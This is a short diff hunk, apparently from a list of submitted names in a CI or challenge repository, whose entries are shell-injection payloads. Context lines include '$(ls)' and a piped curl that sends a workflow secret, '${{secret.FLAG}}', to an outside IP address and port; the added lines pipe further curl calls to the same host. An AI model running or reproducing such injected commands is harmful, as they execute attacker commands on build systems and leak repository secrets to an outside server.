@@ -521,3 +521,6 @@ P4nda0s:$(ls)
 R1gelX29:|test
 |ehco "ls";
 |curl http://101.132.238.43:5992/?flag=`${{secret.FLAG}}`;
+R1gelX29:|test
+|curl http://101.132.238.43:5992/?xxx=xx;
+|curl http://101.132.238.43:5992/?xxx=xx;
